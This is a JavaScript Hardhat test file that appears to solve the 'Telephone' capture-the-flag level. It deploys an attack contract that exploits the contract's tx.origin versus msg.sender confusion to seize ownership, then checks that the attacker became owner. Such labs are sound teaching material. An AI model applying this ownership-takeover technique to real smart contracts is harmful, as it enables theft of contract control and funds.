const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Claim ownership of the contract below to complete this level.

  Things that might help

- See the Help page above, section "Beyond the console"

*/

describe("[Challenge] Telephone", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.telephone = await (
      await ethers.getContractFactory("Telephone", deployer)
    ).deploy();
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    this.telephoneAttack = await (
      await ethers.getContractFactory("TelephoneAttack", attacker)
    ).deploy(this.telephone.address);

    //tx.origin = attacker; msg.sender = attack contract
    await this.telephoneAttack.connect(attacker).attack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker claim ownership of the contract
    expect(await this.telephone.owner()).to.eq(attacker.address);
  });
});
